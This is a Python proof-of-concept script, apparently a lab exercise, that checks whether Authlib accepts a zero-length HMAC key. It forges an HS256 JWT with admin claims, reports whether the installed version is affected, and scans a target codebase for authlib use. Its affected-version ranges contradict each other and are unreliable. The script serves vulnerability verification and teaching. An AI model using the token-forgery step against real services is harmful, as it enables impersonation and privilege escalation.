"""ex12 · CVE-2026-114616 —— Authlib 接受空 HMAC key，HS256 签名可伪造

这个 PoC 证明的是**漏洞机制真实存在**，不是「我们靶场能被攻破」——
那是第二个问题，脚本最后会单独回答。两个问题必须分开，
不然「库有洞」会被误读成「我们的系统在流血」。

漏洞
----
Authlib 的对称（oct）密钥处理接受**零长度**的 key 作为合法的 HMAC 签名/验签密钥。
空 key 的 HMAC 摘要任何人都能在本地复现 → 攻击者不需要知道任何密钥，
就能伪造出通过 HS256/HS384/HS512 验签的任意 token。

  CVE-2026-114616 · GHSA-8m4g-j4wp-wgcg
  受影响：authlib <= 1.7.2     修复：1.9.1
  根因：authlib/jose/rfc7518/oct_key.py 的 validate_raw_key 只做 isinstance 检查，
        b'' 通过；import_key 只拒绝 PEM/SSH 前缀，空字节不匹配任何前缀。

同一家族（跨语言）：fast-jwt CVE-2026-44351、ruby-jwt CVE-2026-45363。

跑法
----
红（靶场 venv 里现装的 authlib 1.6.9 = 受影响版本）：

    python exercises/ex12_authlib_empty_hmac.py

绿（修复版 1.9.1，装到 deps/fixed/ 后用 PYTHONPATH 切过去）：

    python exercises/_fixed_deps.py --spec authlib==1.9.1
    python exercises/ex12_authlib_empty_hmac.py          # PYTHONPATH 已切 → 绿

退出码：0 = 符合该版本的预期（红版接受 / 绿版拒绝），1 = 不符合。
"""
from __future__ import annotations

import os
import sys
import warnings
from pathlib import Path

warnings.filterwarnings("ignore")
sys.stdout.reconfigure(encoding="utf-8")

ROOT = Path(__file__).resolve().parents[1]
TARGET = Path(os.environ.get("PHA_TARGET_ROOT", r"I:\A2A\3\A2AServer"))
FIXED = Path(os.environ.get("PHA_FIXED_DIR", ROOT / "deps" / "fixed"))

CVE = "CVE-2026-114616"
GHSA = "GHSA-8m4g-j4wp-wgcg"
FIXED_VERSION = "1.9.1"
AFFECTED_BELOW = "1.9.1"

# 攻击者要伪造的 claims —— 任意内容都能过，这就是问题所在
FORGED_CLAIMS = {"sub": "admin", "role": "admin", "iss": "https://pha.local"}


def which_authlib():
    import authlib
    ver = getattr(authlib, "__version__", "?")
    path = Path(authlib.__file__).resolve()
    return ver, path


def in_fixed_dir(path: Path) -> bool:
    try:
        return FIXED.resolve() in path.parents
    except Exception:
        return False


def attempt_forgery():
    """返回 (是否被接受, 详情)"""
    from authlib.jose import jwt

    # 攻击者侧：用空 key 签名。key 长度 0。
    token = jwt.encode({"alg": "HS256"}, FORGED_CLAIMS, b"")

    # 受害者侧：用同一个空 key 验签（应用配置成了空 key / key 来自不受信来源）
    claims = jwt.decode(token, b"")
    return True, claims, token


def main() -> int:
    print("=" * 78)
    print(f"ex12 · {CVE} · Authlib 空 HMAC key 伪造")
    print("=" * 78)

    try:
        ver, path = which_authlib()
    except Exception as e:
        print(f"[!] 装不上 authlib：{e}")
        return 2

    is_fixed_dir = in_fixed_dir(path)
    print(f"  authlib 版本 : {ver}")
    print(f"  加载路径     : {path}")
    print(f"  来自修复版目录: {'是（绿）' if is_fixed_dir else '否（靶场现装版本）'}")
    print()

    # 版本判定：注意 OSV 的 affected 区间是 introduced=0 / fixed=1.9.1，
    # 也就是「<= 1.9.0 受影响，1.9.1 修复」。这里按同一语义判。
    def is_vulnerable(v: str) -> bool:
        nums = []
        for part in v.split("."):
            num = "".join(c for c in part if c.isdigit())
            nums.append(int(num) if num else 0)
        while len(nums) < 3:
            nums.append(0)
        return tuple(nums) < (1, 9, 1)

    vulnerable = is_vulnerable(ver)

    print("── 步骤 1：用零长度 key 签一个 token ──")
    try:
        accepted, claims, token = attempt_forgery()
    except ValueError as e:
        # 修复版：签的时候就直接拒了
        print(f"  签名被拒 → {type(e).__name__}: {e}")
        print()
        if vulnerable:
            print(f"  ✗ 意外：{ver} 声称是受影响版本，却拒绝了空 key")
            return 1
        print(f"  ✓ 绿 · {ver} 已拒绝零长度 oct key（修复版 ≥ {AFFECTED_BELOW}）")
        print(f"    判据：零长度对称密钥必须被拒 —— 否则任何人都能伪造 HS256 token")
        return 0

    print(f"  签名成功（攻击者不需要知道任何密钥）：{token[:60]}...")
    print()
    print("── 步骤 2：用同一个零长度 key 验签 ──")
    if accepted:
        print(f"  ✗ 红 · 验签通过！claims = {claims}")
        print()
        if not vulnerable:
            print(f"  ✗ 意外：{ver} 声称是修复版，却仍然接受空 key")
            return 1
        print(f"  ✓ 红 · {ver} 落在受影响区间（<= {AFFECTED_BELOW}）")
        print("    判据：零长度对称密钥被接受 → HS256 签名形同虚设")
        print("          这正是「系统正常地做了错的事」—— 不抛异常，验签照样通过")
    else:
        print("  验签被拒")
        return 0

    # ------------------------------------------------------------------
    # 第二个问题：这个洞在**靶场**里接上线了吗？
    # 「库有洞」≠「我们的系统能被打」。这一步必须单独判。
    # ------------------------------------------------------------------
    print()
    print("=" * 78)
    print("第二个问题：靶场的代码里，这个洞接上线了吗？")
    print("=" * 78)

    hit = scan_target_usage()
    if hit["imports"]:
        print(f"  ⚠ 靶场有 {len(hit['imports'])} 处 import 了 authlib：")
        for f in hit["imports"][:10]:
            print(f"     {f}")
        print("  → 这一条要人工判：那几处用的 API 会不会走到空 key 的路径？")
    else:
        print("  ✓ 靶场代码里没有任何地方 import authlib。")
        print("    → 结论：**命中但接不上**。")
        print("      authlib 写在 requirements 里（供应链上确实存在这个版本），")
        print("      但业务代码没调用它 → 这条不构成可利用漏洞，")
        print("      只构成「声明了没用」的依赖卫生问题。")
        print()
        print("    这个区分就是 ex09 的「机器判有证据 / 无证据」用在这里：")
        print("    机器能证明「版本命中」，证明不了「路径可达」—— 后者要人判。")

    print()
    print(f"  修复：升级 authlib ≥ {FIXED_VERSION}"
          f"（{GHSA}）")
    return 0


def scan_target_usage():
    """扫靶场源码里有没有 import authlib"""
    imports = []
    if not TARGET.exists():
        return {"imports": imports}
    skip = ("node_modules", ".venv", "__pycache__", ".git", "site-packages", "e2e")
    for py in TARGET.rglob("*.py"):
        parts = set(py.parts)
        if parts & set(skip):
            continue
        try:
            txt = py.read_text(encoding="utf-8", errors="replace")
        except Exception:
            continue
        for i, line in enumerate(txt.splitlines(), 1):
            s = line.strip()
            if s.startswith(("import authlib", "from authlib")):
                imports.append(f"{py.relative_to(TARGET)}:{i}  {s}")
    return {"imports": imports}


if __name__ == "__main__":
    sys.exit(main())
